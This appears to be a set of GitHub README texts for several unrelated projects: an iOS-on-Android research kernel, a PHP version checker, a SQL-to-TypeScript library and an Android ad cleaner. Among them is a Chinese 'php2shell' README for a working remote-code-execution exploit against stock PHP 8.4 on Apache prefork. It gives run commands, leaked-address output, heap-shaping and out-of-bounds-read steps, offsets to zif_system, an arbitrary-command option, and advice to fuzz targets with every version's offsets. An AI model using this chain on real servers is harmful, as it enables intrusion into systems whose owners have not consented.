items.readme:
# HakiOS

English · [中文](README.zh.md) · [Українська](README.uk.md)

HakiOS runs the open-source XNU kernel (xnu-8796.121.2) with my own boot loader and my own drivers
on an Android phone with a Qualcomm SoC, and boots the stock iOS 16.5 user space on top of it:
launchd, backboardd, SpringBoard, the apps. The same thing runs in QEMU (`virt`, aarch64) on a
Linux PC.

Nothing is flashed. The loader goes into RAM through `fastboot boot`, the system lives in RAM for
the length of a session, and a reboot brings the phone back to its own Android. This is a research
bench, not a ROM.

The first phone is the **POCO X5 Pro 5G** (`redwood`, Snapdragon 778G). The kernel knows nothing
about it in advance: every address, interrupt, power rail and firmware comes from the phone's own
device tree and its own Android, so a port to another Qualcomm phone is a new directory under
`devices/`, not a rewrite.

## What is in the repository

Only my code and my data:

- the kernel: a patch to Apple's open-source XNU (`xnu/hakios.patch`, APSL 2.0) and my driver
  files (`xnu/files/`), laid over a fresh clone by `xnu/apply.sh`;
- the boot loader (`xnuloader/`), my programs and libraries (`userland/src/`), tools (`tools/`),
  build and run scripts;
- `prebuilt/`: the kernel, loader and libraries built from this repository;
- `devices/poco-x5-pro/`: what one phone needs (its UEFI port, device tree, firmware script).

Not in the repository, never:

- any file of iOS: no binary, image, cache, font, picture or screenshot. You build the system
  image on your machine from the iOS 16.5 IPSW, which `sysimage/fetch.sh` downloads from Apple's
  public servers for you, without decrypting or circumventing anything;
- the phone's firmware (GPU, Wi-Fi, audio DSP, modem, haptics, cameras): it is the vendor's and
  is pulled from your own phone into `fw-*/`, which git ignores;
- keys, certificates, activation, or anything that would make the phone pass as an iPhone to
  Apple's services. Signing in to an Apple account is impossible here and not a goal.

## Status

| Works | Not yet |
|---|---|
| Lock screen, home screen, Control Center, gestures, the stock apps | Cellular: the modem boots, sees the network, the SIM is bound, the IPA data path and `en1` are in place; registration, the data session and the status bar bars are in progress (`docs/cellular.md`) |
| Touch screen, multitouch, power and volume buttons | Bluetooth |
| All 8 CPU cores, the big core at 2.4 GHz | Charging under this kernel |
| GPU rendering on Adreno (`gpu=1`, OpenGL ES through Mesa) | Metal (there is a shader compiler, no Metal) |
| Speakers and microphone (`adsp=1 sound=4 mic=4`) | Apple account: no Secure Enclave |
| Battery level in the UI (through the audio DSP, `adsp=1`) | |
| Vibration (`haptic=5`) | |
| Wi-Fi: radio, driver, network connection (`wifi=1`) | |
| Cameras in Camera.app (`cam=5`) | |
| `/private/var` kept across reboots (`var_store=1 ufs_write=1`) | |
| Sileo, Procursus packages, SSH into the phone | |

## Quick start in QEMU

Linux x86-64, about 12 GB of disk, 7-Zip 23 or newer, `lz4`, `qemu-system-aarch64`, `edk2-aarch64`.

```sh
git clone https://github.com/oosexgang/hakios-os.git hakios
cd hakios
sysimage/fetch.sh             # the iOS 16.5 IPSW from Apple's servers, the needed parts unpacked (7.4 GB)
REST=1 userland/build.sh      # the APFS images: userland/root.apfs and userland/system.apfs
mkdir -p logs
qemu/run-ios.sh 1200 -display gtk > logs/qemu.log     # a 20-minute session
```

The lock screen appears after two or three minutes. The mouse with the button held is a finger;
`H` is Home, `L` is the power button, `↑`/`↓` are volume.

## On the phone

A phone with a port (`devices/poco-x5-pro/`, POCO X5 Pro 5G), its boot loader unlocked, `adb` and
`fastboot` on the PC, the images from the previous section, and the phone's own firmware:

```sh
devices/poco-x5-pro/pull-firmware.sh    # GPU, Wi-Fi, audio/battery, haptics, modem, cameras -> fw-*/
./xl enter                          # Android -> fastboot -> our loader in RAM
./xl ramdisk userland/system.apfs   # the system image into the phone's RAM (~80 s), once per loader session
XL_SB_DELAY=8 XL_SECS=600 \
XL_CMDLINE="bootcpu=7 cpus=8 cpufreq=1 ufs=2 touchscreen=1 gpu=1 adsp=1 sound=4 wifi=1 haptic=5 modem=1" \
./xl run                            # a 10-minute session, the log goes to logs/
./xl reboot                         # back to Android
```

`tools/modem-cycle.sh "ARGS" SECS` does all of that in one command and returns the phone to Android.

The main kernel arguments (the full list is in `docs/ru/notes.md`):

| Argument | What it does |
|---|---|
| `cpus=8 bootcpu=7 cpufreq=1` | all CPU cores and their clocks |
| `touchscreen=1` | the touch screen |
| `gpu=1` | rendering on Adreno (an image built with `GL=1`, firmware in `fw-gpu/`) |
| `adsp=1 sound=4 mic=4` | the audio DSP: speakers, microphone; battery and charging come with it |
| `haptic=5` | the vibration motor |
| `wifi=1` | Wi-Fi (the network from `fw-wifi/network`) |
| `cam=5` | the cameras |
| `modem=1` | the modem beside the system: its firmware, file systems, IPA, SIM, NAS |
| `modem_step=N` | the modem step by step, for debugging (`docs/cellular.md`) |
| `var_store=1 ufs_write=1` | keep `/private/var` across reboots |

## Building from source

The kernel (Linux: theos with its cctools and `iPhoneOS16.5.sdk`; macOS: Xcode or cctools, the SDK
is fetched for you):

```sh
xnu/apply.sh             # XNU sources from Apple's GitHub + my changes -> xnu-src/
xnu-deps/setup.sh        # dependencies, tools and the SDK
./xnu-build.sh -j8 -k    # -> xnu-src/.../BUILD/obj/DEVELOPMENT_ARM64_BCM2837/mach.development.bcm2837
```

The loader: `xnuloader/build.sh` (clang + lld-link, an EFI application without EDK2). The header
`xnuloader/identity.h`, the properties by which iOS tells which iPhone it is, is not kept in the
repository: `xnuloader/mkidentity.sh` makes it at build time from the device tree in your own IPSW
(one 34 KB file; LZFSE is decoded by `lzfse`, macOS's `compression_tool` or the Python `lzfse`
module, or the open lzfse library gets built). User space and the images: `REST=1 userland/build.sh`
(`MODEM=1 SYSTEM=1` put the modem's firmware into the system image). Details: `xnu/README.md`,
`docs/ru/notes.md`.

## Layout

| Directory | Contents |
|---|---|
| `xnu/` | the kernel patch and files; `apply.sh`, `export.sh`; a README about the kernel |
| `xnu/files/bsd/dev/hakios.*.c` | my drivers: display, touch, UFS, GPU, Wi-Fi, audio, modem (`hakios.mpss.c`), its packets (`hakios.ipa.c`, `hakios.cell.c`), SIM/NAS, haptics, cameras |
| `xnuloader/` | the boot loader (a UEFI application) |
| `userland/` | my programs and libraries (`src/`), the image build, launchd jobs |
| `sysimage/` | scripts that fetch and unpack the OS files from the IPSW (none of the files themselves) |
| `devices/poco-x5-pro/` | one phone: its UEFI port, device tree, prebuilt UEFI images, firmware script, tools |
| `tools/` | APFS, firmware, QMI tests, run scripts |
| `qemu/` | running in QEMU |
| `docs/` | `notes.md`: the detailed notes (Russian); `cellular.md`: cellular; `air.md`, `metal.md`: the GPU |
| `prebuilt/` | the built kernel, loader and libraries |

## Devices

The kernel, loader and user space are shared. Everything about one phone lives in
`devices/<name>/`: its UEFI, device tree, firmware list and tools. Today there is one,
`devices/poco-x5-pro/`, and its README is the map of what a port to another Qualcomm phone must bring.
The phone's drivers are the files `xnu/files/bsd/dev/hakios.*.c`; the head of each says where its
numbers came from.

## Cellular

The modem (the Hexagon MPSS) is brought up from XNU: firmware through TrustZone, shared memory,
SMP2P, GLINK, QRTR, QMI; its file systems are served from the UFS (read-only, writes stay in kernel
memory), TFTP and the service registry are mine. The IPA packet engine runs with its firmware,
clock and SMMU context, and the handshake with the modem goes through. The SIM is bound to the
subscription and NAS reads the signal. The current state and the whole story are in
`docs/cellular.md`.

## Independent, and Apple-free at the core

HakiOS is an independent research project. It is **not affiliated with or endorsed by Apple**;
"iOS", "iPhone", "XNU" and "Apple" are named only to describe what the code works with. The core
kernel, the boot loader and the open tools build and run with nothing of Apple's:

```sh
make qemu-open      # the open kernel + a placeholder loader + a tiny raw-syscall user space, in QEMU
```

No IPSW, no iOS user space, no firmware. Booting the stock iOS user space (`make qemu`,
`make phone`) is an optional path that needs the IPSW and the phone's firmware, which you supply
from your own device.

## Licenses and the legal side

My code is under the license of the files it changes: the XNU patch under the Apple Public Source
License 2.0 (Apple publishes XNU under it; the terms are met: changes are published as source,
notices are kept), the rest as the file headers say. iOS, its images, Apple's trademarks and the
phone's firmware belong to their owners, are not in this repository and are not distributed by me;
everyone takes them from their own phone and their own IPSW. "iOS", "iPhone" and "Apple" are
named only to describe what the code works with. If you believe a file here infringes anyone's
rights, open an issue and I will remove it.

The detail is in separate files: `LEGAL.md` (what is and is not distributed, and the limits of
these statements), `COMPLIANCE.md` (how the APSL 2.0 and other terms are met, and the items still
to verify), `THIRD_PARTY_LICENSES.md` (every third-party component with origin and license), and
`NOTICE` (the short canonical list). None of this is legal advice.

# php2shell - 官方环境 无需display_errors，不修改memory_limit

中文 | [English](readme_en.md) | [日本語](readme_ja.md)

**官方 prefork 配置（MaxRequestWorkers=150）下**，在完全远程、只用 HTTP、目标页面只有 `<?php echo "OK\n"; ?>`、不写目标侧
PHP 的约束下，一条命令拿到 RCE：

- stock 官方镜像 + 官方 ini + 官方 worker：**10/10**
- 单 worker 基线（早期标定/调试）：**20/20**
- 单次约 3–4 秒（含 149 个占位连接），被固定的 worker 不重启，目标 ini 未改

# 通用利用

理论上只要你计算出所有php版本的偏移，然后利用这些偏移批量去fuzz，总有一条fuzz是能rce的。反正worker崩了也会重启，不怕目标打挂。

关于 worker：官方 prefork 的 `MaxRequestWorkers=150` 也已打通。脚本先占住 149 个 worker 的未完成请求，再把 A1/B1/A2/B2 固定到剩下的同一个 child；单 worker 只是早期的调试形态（`--workers 1` 仍可复现）。

## 快速开始（官方 php.ini-production / display_errors=Off / 128M）

```bash
git clone https://github.com/9bie/php2shell-bypass-aslr-exp.git
cd php2shell-bypass-aslr-exp

# 1) 起目标：stock 官方镜像；容器里只把官方 php.ini-production 复制成 php.ini
./pure/run_pure.sh
# target: OK
# architecture: x86_64 (run exploit with --arch x86_64)
# PHP 8.4.26 ...
# display_errors => Off => Off
# memory_limit => 128M => 128M
# workers: official (run exploit with --workers 150)

# 2) 一条命令：A1 -> B1 泄漏 -> A2 -> B2 -> id
python3 exploit.py --port 18110
#       --arch auto（默认）：自动识别 x86_64 / aarch64
#       pinned 150/150 workers (149 holders)
# [try 1] A1: END-cleanup send_cookie OOM
# [try 1] B1: stale-id OOB read (chunk base + libphp)
#       arch=x86_64 decoded=819208 zval_ptr_dtor=0x7fe00ef5db60 -> libphp=0x7fe00e8ff000
#       chunk buckets: [('0x7fe00c600000', 7495), ('0x7fe00ee00000', 1095),
#                       ('0x7fe00cc00000', 87), ('0x7fe00c400000', 79)]
# [try 1] A2 + B2: main=0x7fe00cc00000 S=0x7fe00ccf8398 zif_system=0x7fe00ed64370
# [4/4] RCE OK; proof .../out/p1:
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

不编译 PHP/Apache、不 build 镜像、不挂 gdb、不改目标 ini。
`pure/run_pure.sh` 默认容器 `p2s-pure-18110`、端口 `18110`，默认使用
官方 prefork 配置（MaxRequestWorkers=150），起完会打印实际架构、ini 和
MPM 值；`--single` 才挂非官方的单 worker 覆盖
`pure/docker/apache-single-worker.conf`（配合 `--workers 1`）。`docker/apache.conf`
只是给旧 harness 保留的兼容软链，指向同一个文件。
Linux 上没有 docker 组权限时脚本会自动改用 `sudo docker`，也可以显式
`DOCKER="sudo docker" ./pure/run_pure.sh`；`--dbg` 仅用于换成带符号的
同一构建做离线标定。

常用参数：

```bash
# 换新 ASLR 复测（重启容器）
python3 exploit.py --port 18110 --restart p2s-pure-18110

# 官方 worker 是默认值；--single 起的单 worker 目标用 --workers 1
python3 exploit.py --port 18110 --workers 1

# ARM64 也可显式指定（默认 --arch auto 自动识别）
python3 exploit.py --arch aarch64 --port 18110 --workers 1

# 自定义命令：把脚本写进挂载目录，再用 sh 执行
printf 'id; uname -a > /out/p1\n' > out/c
python3 exploit.py --port 18110 --cmd 'sh</out/c'
```

`--retries` 默认 3；如果某次越界窗口里最常见的指针不是
`zval_ptr_dtor`，脚本会用 `libphp-main` 的合理区间检查丢弃这次泄漏，
整条链重来。

## 这条纯 HTTP 链

目标页面只有 `<?php echo "OK\n"; ?>`，攻击流量只有 chunked multipart
和普通 GET/POST：

0. **worker pinning**：官方 `MaxRequestWorkers=150`；先开 149 个只发了
   一半 body 的 POST 占住其它 child，A1/B1/A2/B2 就都会落到剩下的同一个
   child，跨请求的悬空指针才有效。
1. **chunked 绕过 `post_max_size`**：不带 `Content-Length` 时
   `content_length=0`，`rfc1867_post_handler` 开头的检查被跳过，
   可以发送远大于 8M 的 body 做堆整形。
2. **A1**：860 个 depth-64 嵌套文件字段 + filler + 大值 + 4000B
   `PHP_SESSION_UPLOAD_PROGRESS`，在 END cleanup 的 `php_url_encode`
   里 OOM；bailout 留下悬空的 `PS(id)` / `PS(mod_data)`，`send_cookie=1`。
3. **B1（越界读）**：安全 close 后让 `PS(id)` 指向伪造的
   `zend_string` 头（len=0xC8000，data 含 `/`），`Set-Cookie` 把 id
   chunk 之后 800KB 内存编码出来。窗口里同时有：
   - 2MiB 对齐的 chunk 指针簇 → id chunk / main chunk base；
   - `G:400` 在 id chunk 尾部留下的洞被 900 个嵌套数组字段填满，
     真实 HashTable 的 `pDestructor = zval_ptr_dtor` 出现 1095 次
     → `libphp = 值 - 0x65EB60`。
4. **A2 + B2**：cheap-OOM 把 `PS(hash_serialize_verifier)` 指到堆上
   (`main+0x7D720`)；B2 用 384B 引用值把它覆盖成指向
   `S=main+0xF8398` 的 zval，S 处伪造 zend_array 的
   `pDestructor = zif_system` (`libphp+0x465370`)，shutdown 时
   `zend_hash_destroy` 调用 `system("id>/out/p1")`。

偏移（本构建，ASLR 无关）：

| 符号/位置 | x86_64 | aarch64 |
|---|---|---|
| 泄漏的 `zval_ptr_dtor` 指针 | `libphp+0x65EB60` | `libphp+0x63812B` |
| `zif_system` | `libphp+0x465370` | `libphp+0x42CD70` |
| fake array `S` | `main+0xF8398` | `main+0xF8398` |
| A2 的 `hsv` | `main+0x7D720` | `main+0x7D720` |

aarch64 的 `zval_ptr_dtor` ELF 符号位于 `0x638120`，但此泄漏中重复出现的
指针在其后 11 字节，因此 profile 减去 `0x63812B`。
目标环境：Debian 13 (trixie)、Apache 2.4.69 prefork、PHP 8.4.26 NTS
mod_php、files session handler。换 PHP 构建/版本需要重新标定偏移；
ASLR 每次容器启动会变，链上两次泄漏会自己算出来。

## 证据

- 机制与标定：[pure/RESEARCH_PURE_128M.md](pure/RESEARCH_PURE_128M.md)
- 全链脚本：[exploit.py](exploit.py)（`pure/pwn_pure.py` 保留为别名）
- 调试镜像批量日志：[pure/evidence/pwn_pure_batch_20261022.log](pure/evidence/pwn_pure_batch_20261022.log)
- 官方镜像日志：[pure/evidence/pwn_pure_official_20261022.log](pure/evidence/pwn_pure_official_20261022.log)
- 官方 worker 日志：[pure/evidence/official_workers_20261022.log](pure/evidence/official_workers_20261022.log)
- 原生 ARM64 官方镜像日志（10/10 个全新容器）：[pure/evidence/arm64_stock_20261023.log](pure/evidence/arm64_stock_20261023.log)
- 原生 ARM64 官方 worker 日志（3/3 个全新容器）：[pure/evidence/arm64_official_workers_20261023.log](pure/evidence/arm64_official_workers_20261023.log)
- proof：[pure/evidence/pwn_pure_proof_p1.txt](pure/evidence/pwn_pure_proof_p1.txt)

## 旧线（legacy，非本目标）

早期提交里的 `exploit.py` 走的是**自定义** `docker/php.ini`
（`display_errors=On`、`memory_limit=8M`、`max_input_vars=1000`），
与本 README 的官方配置目标无关，已归档到
[archive/legacy-8m/exploit.py](archive/legacy-8m/exploit.py)；
同目录下的 [HTTP_HEAP_LEAK.md](archive/legacy-8m/HTTP_HEAP_LEAK.md)、
[ASLR_PURE_HTTP.md](archive/legacy-8m/ASLR_PURE_HTTP.md) 等描述的是那一线；
旧的 `docker/php.ini`、`docker/docker-compose.yml`、`docker/offsets.py` 和
`lab/apache2_aslr.conf` 也归档到了 `archive/legacy-8m/docker|lab/`。
真正的单 worker 配置和目标页面在 `pure/docker/`
（`apache-single-worker.conf`、`www/index.php`）；`docker/` 只保留
`apache.conf`、`www` 两个兼容软链指向那里。

## 复现声明

- 目标配置就是官方 `php.ini-production`（`display_errors=Off`、
  `memory_limit=128M`）和官方 prefork worker（MaxRequestWorkers=150）：
  没有自定义 ini、没有 `display_errors=On` 依赖、没有目标侧文件、
  没有 `session_start()`、交付路径不用 gdb。
- 仅用于授权环境中的漏洞研究与复现。

items.readme:
# PHP Version Checker

Get a version-based PHP2Shell warning from a website's PHP headers or local installation.

To install both skills, ask Codex:

```text
$skill-installer install both skills from https://github.com/openai/php2shell-checker
```

Use [phpcheck-server](skills/phpcheck-server/SKILL.md) when you have server
access, or [phpcheck-url](skills/phpcheck-url/SKILL.md) when you only have a URL:

```text
$phpcheck-url check https://example.com
```

```text
$phpcheck-server check the PHP version serving my site
```

## Run directly

Check a website:

```sh
node phpcheck.js "https://example.com"
```

## Results

| Result | Exit code | Meaning |
| --- | --- | --- |
| `OK` | `0` | Advertised version meets an upstream fixed release. |
| `POTENTIALLY VULNERABLE` | `1` | Advertised version is in an affected range. |
| `UNKNOWN` | `3` | Missing or unrecognized version, prerelease, or failed check. |

Use `--json` for machine-readable output. `patch_status` is `ok`,
`potentially_vulnerable` or `unknown`. Invalid arguments exit with code `2`.

Versions below a listed upstream fix return `potentially_vulnerable` and
exit `1`. PHP 5.4–5.6, 7.0–7.4, 8.0 and 8.1 also return this warning, even
with a higher patch number such as 8.1.35.

## URL checks

URL mode reads `X-Powered-By` and `Server`, sends `HEAD`, and falls back to
`GET` only when `HEAD` returns 405 or 501. It does not follow redirects or
inspect response bodies. Missing or hidden PHP headers return `UNKNOWN`.

The upstream fixed releases are 8.2.35, 8.3.36, 8.4.27 and 8.5.12, from the
[October 21 PHP advisory](https://www.php.net/archive/2026.php#2026-10-21-5).
HTTP headers cannot tell whether the version contains a backported fix. Even `OK`
only describes the advertised version - it doesn't verify the installation!
The checker does not send exploit probes.

## Contributing

OpenAI is not accepting external code contributions to this project. Bug
reports and non-code feedback are welcome through GitHub issues. See
[CONTRIBUTING.md](CONTRIBUTING.md).

## License

This project is licensed under the [Apache License 2.0](LICENSE).

items.description: Import .sql files into TypeScript with full type inference and zero codegen.
items.readme:
Import .sql files into your TypeScript code with full type inference

Read the docs →


If you have a file like this: ```sql -- get_author.sql select u.id, u.name, count(p.id)::int as post_count from users u left join posts p on p.user_id = u.id where u.id = :id::int group by u.id ``` You can import it directly from a TypeScript file like this: ```ts // main.ts import postgres from "postgres"; import getAuthor from "./get_author.sql"; const db = postgres(process.env.DATABASE_URL); const author = await getAuthor.run(db, { id: 1 }); // { id: number; name: string; post_count: number } | null ``` Reylo is powered by TypeScript [content mappers](https://github.com/microsoft/typescript-go/pull/4712), introduced in TypeScript 7.1 (currently [in beta](https://devblogs.microsoft.com/typescript/announcing-typescript-7-1-beta/)), which let you dynamically define static types for external file types and integrate them directly into TypeScript compilation. Reylo is the perfect option for the agent era: - 💪 **The full power of SQL** — any statement, function, operator or syntax your database supports, in its own dialect. - 🌵 **DRY** — the types come from the SQL itself: no hand-written row types, no schema file to keep in sync. - 🎯 **Checked against your database** — a misspelled column, a wrong parameter or a dropped table is a type error, in `tsc` and in your editor. - 🤖 **Agent-friendly** — each fact lives in one place, so an agent cannot leave a stale type behind, and the type check finds every caller it missed. - 🧩 **Postgres, MySQL and SQLite** — bring your own driver: `pg`, postgres.js, `mysql2`, `better-sqlite3`, `Bun.sql`, Cloudflare D1 and [more](#supported-drivers). - ⚡ **No codegen** — the type checker asks Reylo directly: no generated files, no watcher. ## Setup To install Reylo, you'll need: - **TypeScript 7.1 (currently in beta).** The first release with content mappers. - **Node 24 or later.** - **A running dev database.** Postgres, MySQL 8.0.22 or later, or a SQLite file: Reylo reads your current schema from it. Install Reylo, the engine for your database and TypeScript 7.1: ```sh npm install reylo npm install -D @reylosql/postgres # or mysql, sqlite npm install -D typescript@beta ``` Add Reylo to `tsconfig.json`, for `.sql` files and for its project file, `.reylo.yaml` or `.reylo.yml`: ```jsonc // tsconfig.json { "compilerOptions": { /* ... */ }, "contentMappers": [ { "package": "reylo", "extensions": [".sql", ".reylo.yaml", ".reylo.yml"] } ] } ``` Then type-check with `--runExternalCode`, which lets `tsc` run content mappers: ```jsonc // package.json { "scripts": { "typecheck": "tsc --noEmit --runExternalCode" } } ``` Point Reylo at your dev database with `DATABASE_URL`, in your environment or in `.env`. Its scheme tells Reylo which database you use: ```sh # .env DATABASE_URL=postgres://localhost:5432/app # or mysql://…, or file:./app.db for SQLite ``` To make `.sql` imports work at run time too, load Reylo where your code runs. On Node: ```sh node --env-file=.env --import reylo/register main.ts ``` For Bun, Nub, Vite, Next.js, esbuild, webpack, Rspack, Cloudflare Workers and Jest, add [the plugin for your setup](https://reylo.dev/#plugins), or copy its complete [example project](https://github.com/colinhacks/reylo/tree/main/examples). To see the types as you type, set up [your editor](https://reylo.dev/#editors). ## Usage Write a query in a `.sql` file, import it, and run it with your database driver: ```sql -- get_user.sql select id, name, email from users where id = :id::int ``` ```ts import getUser from "./get_user.sql"; const user = await getUser.run(db, { id: 1 }); // { id: number; name: string; email: string | null } | null ``` Name each parameter with a colon, and give it a type with a cast where the query doesn't pin one down. Pass `.run()` your driver's client: a pool, a client, or a connection or transaction taken from one. It resolves to the rows, shaped by how many the query can return: | The query | Resolves to | | --- | --- | | A match on a primary or unique key, or `limit 1` | `Row \| null` | | An aggregate without `group by`, a one-row `insert … returning` | `Row` | | An `insert`, `update` or `delete` without `returning` | `void` | | Anything else | `Row[]` | An imported query also has `.runSync()`, `.try()`, `.with()`, `.sql`, `.raw` and `.source` ([Usage](https://reylo.dev/#usage)). Every query Reylo runs is published on Node's tracing channel `reylo:query`, for a tracer or a logger to subscribe to ([Tracing](https://reylo.dev/#tracing)). ## What Reylo infers To type a query, Reylo has your dev database prepare it, without running it, and reads back the type of every column and parameter. On top of that, it infers: - **Nulls** — a column is nullable unless its schema, a join or a `where` test rules null out. - **Cardinality** — a match on a unique key is one row or `null`, and an aggregate is exactly one row. - **Unions** — an enum, or a column whose check constraint lists its values, is a union of them. - **JSON** — JSON the query builds, and a JSON column with a JSON Schema check, keep their shape. Each has examples in [Inference](https://reylo.dev/#inference). ## Supported drivers Reylo is bring-your-own-driver. Pass `.run()` a client from any of these, or a Drizzle database over one: - **Postgres** — `pg`, postgres.js, `Bun.sql`, PGlite, Neon, `pg-promise`, `slonik`, `@vercel/postgres` - **MySQL** — `mysql2`, `mariadb`, PlanetScale, `Bun.sql` - **SQLite** — `better-sqlite3`, `node:sqlite`, `Bun.sql`, libSQL, Turso, Cloudflare D1 and Durable Objects, `sqlite3`, `sqlite` ## Documentation [reylo.dev](https://reylo.dev) covers the rest: every plugin and editor, configuration, errors, each database's data types and edge cases, and advanced examples. Agents can read it all as Markdown at [reylo.dev/llms.txt](https://reylo.dev/llms.txt). ## License [MIT](LICENSE)

**1 连接手机**：插线即认出手机，内置开启 USB 调试的图文教程 |
**2 检测**：型号、系统版本、机型脚本、快应用、广告组件 | |
**3 选择要关的**：营销通知按渠道勾选，服务类默认不勾 |
**4 执行**：进度条和实时日志 | |
**5 完成**：每一步的结果，最后提醒关闭开发者模式 |
**反馈**：自动附诊断信息，一键提交 GitHub Issue | --- - 不 root，不解锁，不刷机，系统更新不受影响。 - 只拨系统和 App 自带的开关。挂起广告包这一步要机主点头，一条命令可以还原。 - 搜索、负一屏卡片、应用商店的安装和更新、天气预警、快递提醒，这些功能保留。

改之前：OPPO 软件商店首页。轮播图、必备、必玩、福利标签，全是推广位。

--- ## 处理哪些东西 | 类别 | 例子 | 怎么处理 | |---|---|---| | 系统广告 | 个性化广告、广告跟踪（OAID）、智能推荐服务 | 系统设置里的开关 | | 热搜和资讯 | 下拉搜索的热榜、负一屏资讯、浏览器信息流 | 各 App 设置里的开关，浏览器切到简洁首页 | | 推广位 | 商店的轮播、开屏、悬浮活动、签到福利 | 商店「服务管理」里的开关 | | 营销推送 | 各 App 的「内容与营销」「活动优惠」通知 | 按渠道关，同一个 App 的订单、快递、更新通知保留 | | 广告组件 | `com.opos.ads`、`com.miui.systemAdSolution` 等 | `pm suspend` 挂起，要机主同意 | | 快应用 | 广告里一点就跳进去的「免安装小程序」 | `quickapp` 检测，`quickapp off` 关闭，见 [docs/07-快应用.md](docs/07-快应用.md) | ## 不做的事 - 不卸载、不停用系统应用（`pm uninstall`、`pm disable-user` 都不用）。 - 不改 system 分区，不装模块。 - 不替你同意任何 App 的用户协议。遇到协议页，点「取消」或「以后再说」。 - 不截账号页和手机号页。 --- ## 四种用法

> 用法一要先在手机上打开开发者模式和 USB 调试，带截图的教程：[docs/00-打开开发者模式.md](docs/00-打开开发者模式.md)。 | 用法 | 适合谁 | 要准备什么 | 文档 | |---|---|---|---| | **一：AI 智能体替你跑** | 有电脑，想省事 | 电脑、数据线、一个能执行命令的 AI 工具 | [docs/02-用AI智能体.md](docs/02-用AI智能体.md) | | **二：聊天 AI 带你点** | 只有手机 | DeepSeek、豆包、ChatGPT 任意一个 | [docs/03-用聊天AI.md](docs/03-用聊天AI.md) | | **三：照清单手动关** | 想自己掌握每一步 | 只要手机 | [docs/清单/](docs/清单/) | | **四：桌面客户端** | 不想敲命令 | Mac（Apple / Intel 芯片）或 Windows 10/11、数据线 | [下载](#下载桌面客户端) · [说明](docs/08-桌面客户端.md) | 用法一的开场白，复制给 AI： ```text 请克隆 https://github.com/rddmwmddr/android-ad-cleaner ，读仓库里的 AGENTS.md， 然后帮我给连着电脑的这台手机去广告。每一步改之前告诉我要改什么。 ``` --- ## 实测过的机型 **机型脚本**：一台机型的自动操作步骤，记着「打开哪个 App、点哪几个字进设置页、关哪几个开关、留哪几个」。电脑照着它在手机上点，几分钟做完。设置页因型号和系统版本而不同，所以每个机型一份。 | 品牌 | 机型（型号） | 系统 | 机型脚本 | 手动清单 | 营销通知 | |---|---|---|---|---|---| | 荣耀 | PNM-AN10 | MagicOS 10 | ✅ 实测通过，重跑 4 分钟 | ✅ | ✅ 26 个渠道 | | 一加 | Ace 2 Pro（PJA110） | ColorOS 14.0.0.812 / Android 14 | 源码新增：3 项个性化 + 6 项商店推广位关闭并回读 | 部分，见实测记录 | ✅ 23 个，总开关不变；天气提醒差异见实测 | | OPPO | Find N6（PLP120） | ColorOS 16.0.9 | ⚠️ 路径实测，整段待验证 | ✅ | ✅ 30 个渠道 | | OPPO | Find X10 Pro Max（PMX110） | ColorOS 17 | — | ✅ | ✅ | | OPPO | Find X9 Ultra（PMA120） | ColorOS 16.0.10 | ❌ 页面和 N6 不同，待补 | 部分 | ✅ 27 个渠道 | | OPPO | Find N3 典藏版（PHN110） | ColorOS 16.0.5 | ❌ 待补 | 部分 | ✅ 27 个渠道 | | 小米 | 18 Pro Max（M154FF） | HyperOS 4.0.24 | ✅ 10-25 前轮九段通过，新增兼容改动待复测 | ✅ | ✅ | | vivo | X300 Ultra（V2547DA） | OriginOS 6 | ⚠️ 脚本已补，整段待真机验证 | ✅ | ✅ | 表格反映当前脚本和验证范围。小米 10、荣耀 Magic7 Pro 等反馈已修复可定位的通用缺陷，但仍需对应真机复测；同品牌参考脚本不等于专用适配，详细记录见 [更新记录](CHANGELOG.md)。 - 可先运行通用检测；通知渠道能否安全关闭取决于系统页面和权限，部分 vivo 页面会被跳过。广告跟踪入口也随品牌变化。 - 同一个品牌，系统小版本不同，设置页的名字和层级也会变。机型脚本按型号和系统版本存放，版本对不上时引擎会提示，找不到入口的步骤会跳过，不会乱点。 - 你的机型不在表里：照 [docs/04-给新机型写脚本.md](docs/04-给新机型写脚本.md) 做一份，欢迎提 PR。 --- ## 一次完整的流程

命令写法： ```bash pip3 install -r requirements.txt python3 tool/run.py devices # 看序列号、型号、有没有机型脚本 python3 tool/run.py -s <序列号> check # 只读检查 python3 tool/run.py -s <序列号> backup # 改动前快照 python3 tool/run.py -s <序列号> recipe # 跑机型脚本 python3 tool/run.py -s <序列号> chan-scan # 列营销通知渠道 python3 tool/run.py -s <序列号> chan-off backups/<型号>-<时间>/channels.tsv python3 tool/run.py -s <序列号> quickapp # 检测快应用；quickapp off 关闭 python3 tool/run.py -s <序列号> finish # 收尾，提醒关闭开发者模式 python3 tool/run.py -s <序列号> dev-off --yes # 从电脑关闭开发者模式（最后一步，执行后断开） ```

营销通知按渠道关：天气的「内容与营销」关掉，天气预警保留。

--- ## 仓库结构 ```text AGENTS.md 给 AI 智能体读的操作规范 CHANGELOG.md 源码更新、验证结果与安装包发布状态 docs/ 00-打开开发者模式.md 带截图的分步教程 01-准备工作.md 装 adb、连电脑、无线调试 02-用AI智能体.md WorkBuddy、Claude Code、Codex、Trae、Cursor 03-用聊天AI.md DeepSeek、豆包、ChatGPT 04-给新机型写脚本.md 05-还原.md 06-常见问题.md 07-快应用.md 什么是快应用、怎么检测和关闭 08-桌面客户端.md Mac / Windows 客户端的用法、数据位置、打包 09-社区问题处理.md Issue / PR 处理范围及待验证项 清单/ 各品牌的手动清单 prompts/ 复制给聊天 AI 的提示词 tool/ run.py 总入口 fast.py 读屏、找入口、拨开关的引擎（uiautomator2） chan_fast.py 营销通知渠道 explore.py 新机型探路（实验） gui/ 桌面客户端（pywebview 界面 + PyInstaller 打包） recipes/<品牌>-<型号>/recipe.py 各机型的机型脚本 images/ 文档配图 tests/ 不连接手机的引擎回归测试 ``` ## 反馈 遇到问题、想要新功能、希望支持你的手机，到 [Issues](https://github.com/rddmwmddr/android-ad-cleaner/issues/new/choose) 提交，选对应的模板。 用桌面客户端的话，点左下角「反馈问题」：会自动附上客户端版本、手机型号、系统版本和最近的日志（序列号已替换，不含应用列表和通知内容），打开 GitHub 页面后点提交即可。提交需要 GitHub 账号。 ## 还原 见 [docs/05-还原.md](docs/05-还原.md)。挂起的包和通知渠道各一条命令；App 内的开关按清单路径手动打开。 ## 声明 本项目只调用 Android 系统和厂商 App 公开提供的设置项。各厂商的界面随系统更新变化，使用前请备份，结果以你的手机为准。使用本项目造成的任何问题由使用者自行承担。 许可证：MIT

